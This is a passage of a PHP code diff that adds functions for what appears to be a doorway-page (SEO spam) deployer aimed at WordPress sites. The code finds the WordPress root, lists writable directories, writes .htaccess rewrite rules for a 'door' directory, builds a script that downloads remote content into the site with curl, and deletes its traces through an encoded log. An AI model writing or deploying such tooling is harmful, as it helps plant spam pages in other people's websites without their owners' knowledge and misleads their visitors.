+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FILE, $file);
+    curl_exec($ch);
+
+    rewind($file);
+    file_put_contents($localname, stream_get_contents($file));
+    fclose($file);
+
+    echo $localname . ' - ' . filesizemb($localname) . ' MB' . PHP_EOL;
+}
+
+function detectWProotDir() {
+
+    if (defined('REDEFINE_WP_ROOT_DIRECTORY') && (REDEFINE_WP_ROOT_DIRECTORY !== '')) {
+        if (file_exists(REDEFINE_WP_ROOT_DIRECTORY . '/wp-config.php')) {
+            return REDEFINE_WP_ROOT_DIRECTORY;
+        } else {
+            echo 'Invalid value for REDEFINE_WP_ROOT_DIRECTORY' . PHP_EOL;
+            return;
+        }
+    }
+
+    if (file_exists(CURRENTDIR . '/wp-config.php')) {
+        return CURRENTDIR;
+    }
+    $normalizePath = preg_replace('~\/(wp-admin|wp-includes|wp-content).*$~', '', CURRENTDIR);
+
+    if (file_exists($normalizePath . '/wp-config.php')) {
+        return $normalizePath;
+    }
+
+    return null;
+}
+
+function directorysForWriting($dir, $depthLimit = 1) {
+    if (!is_dir($dir)) {
+        return;
+    }
+
+    $path = realpath($dir);
+
+
+    $objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)
+            , RecursiveIteratorIterator::SELF_FIRST
+            , RecursiveIteratorIterator::CATCH_GET_CHILD);
+
+    $objects->setMaxDepth($depthLimit);
+
+
+
+    foreach ($objects as $name => $object) {
+        if (($path = $object->getPath()) === $dir) {
+            continue;
+        }
+        if (is_dir($object) && is_writeable($object)) {
+            $tmp[] = $path;
+        }
+    }
+
+    return (empty($tmp) && is_writable($dir)) ? array($dir) : array_unique($tmp);
+}
+
+function encodeLog($arr) {
+    return base64_encode(serialize($arr));
+}
+
+function decodeLog($string) {
+    return unserialize(base64_decode($string));
+}
+
+function makeDir($dirname) {
+
+    if ($dirname !== '') {
+        if (!is_dir($dirname)) {
+            if (!mkdir($dirname, 0777, true)) {
+                return false;
+            }
+        }
+    }
+    return true;
+}
+
+function filesizemb($file) {
+    return number_format(filesize($file) / pow(1024, 2), 3, '.', '');
+}
+
+function htaccessRender($doorRootDirName, $relativePath, $blogRelativePath) {
+
+    $firstChunk = <<<STR
+            
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^($doorRootDirName)/(.+)$ /$relativePath/$1/$2 [L,NC]
+RewriteRule ^($doorRootDirName)(/?)$ /$relativePath/$1/index.html [L,NC]
+RewriteRule ^($doorRootDirName)/jquery.js$ /$relativePath/$1/jquery.js [L,NC]
+RewriteRule ^($doorRootDirName)/sitemap.xml$ /$relativePath/$1/sitemap.xml [L,NC]
+
+STR;
+
+    $withSubdir = <<<STR
+RewriteRule ^($doorRootDirName)/(.+)$ /$blogRelativePath/$1/$2 [L,NC]
+RewriteRule ^($doorRootDirName)(/?)$ /$blogRelativePath/$1/index.html [L,NC]
+RewriteRule ^($doorRootDirName)/jquery.js$ /$blogRelativePath/$1/jquery.js [L,NC]
+RewriteRule ^($doorRootDirName)/sitemap.xml$ /$blogRelativePath/$1/sitemap.xml [L,NC]
+          
+STR;
+
+    $thirdChunk = <<<STR
+</IfModule>
+STR;
+
+
+    return ($blogRelativePath !== '') ? htmlspecialchars($firstChunk . $withSubdir . $thirdChunk) : htmlspecialchars($firstChunk . $thirdChunk);
+}
+
+function currenturl($rootDir) {
+    $tmp = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', 'http://' . $_SERVER['HTTP_HOST'] . $rootDir);
+    return $tmp;
+}
+
+function randFile($dir) {
+
+    if ($handle = opendir($dir)) {
+
+        $iter = 1;
+        $end = rand(20, 35);
+        while (false !== ($file_name = readdir($handle))) {
+            if ($iter >= $end) {
+                closedir($handle);
+                return $dir . DIRECTORY_SEPARATOR . $file_name;
+            }
+            $iter++;
+        }
+    }
+}
+
+function renderSitemapUploader($url, $localpath) {
+    $source = <<<STR
+
+function get_file(\$source, \$localname) {
+
+    \$file = fopen('php://temp/maxmemory:0', 'w+b');
+    \$ch = curl_init();
+    curl_setopt(\$ch, CURLOPT_URL, \$source);
+    curl_setopt(\$ch, CURLOPT_FAILONERROR, true);
+    curl_setopt(\$ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt(\$ch, CURLOPT_FILE, \$file);
+    curl_exec(\$ch);
+
+    rewind(\$file);
+    file_put_contents(\$localname, stream_get_contents(\$file));
+    fclose(\$file);
+    curl_close(\$ch);
+    
+    echo \$localname . ' - ' . filesizemb(\$localname) . ' MB' . PHP_EOL;
+    
+}
+
+function filesizemb(\$file) {
+    return number_format(filesize(\$file) / pow(1024, 2), 3, '.', '');
+}
+
+get_file('$url', '$localpath');
+STR;
+
+    return htmlspecialchars($source);
+}
+
+function convertArchiveUrl($url) {
+    $modified = preg_replace('~static\/archives\/.+~', 'static/html/', $url);
+    return $modified . '' . str_replace('-', '/', basename($url));
+}
+
+function urlConvertToLocalpath($url) {
+
+    $firstStep = str_replace('-', '/', basename($url));
+
+    return $firstStep;
+}
+
+function removeDirRec($dir) {
+    if ($objs = glob($dir . "/*")) {
+        foreach ($objs as $obj) {
+            is_dir($obj) ? $this->removeDirRec($obj) : unlink($obj);
+        }
+    }
+    rmdir($dir);
+}
+
+function forceDelete($logFile) {
+
+
+    if (!file_exists($logFile)) {
+        echo 'Log file not found' . PHP_EOL;
+        return;
+    }
+
+    $logSource = file_get_contents($logFile);
+    $logArr = decodeLog($logSource);
+    $dirName = $logArr['dirName'];
+    unlink($logFile);
+    echo 'previous log was delete' . PHP_EOL;
+
+
+    if (!isset($logArr['uploadDirectory'])) {
+        echo 'not found uploaddirectory in log file' . PHP_EOL;
+        return;
+    }
+
+    removeDirRec($logArr['uploadDirectory'] . '/' . $dirName);
+    echo 'door dir ' . $logArr['uploadDirectory'] . '/' . $dirName . ' was delete' . PHP_EOL;
+}
+
+
+function mb_basename($file, $ext = '') {
+    $explodedPath = explode('/', $file);
+    $last = end($explodedPath);
+    return ($ext !== '') ? str_replace($ext, '', $last) : $last;
+}
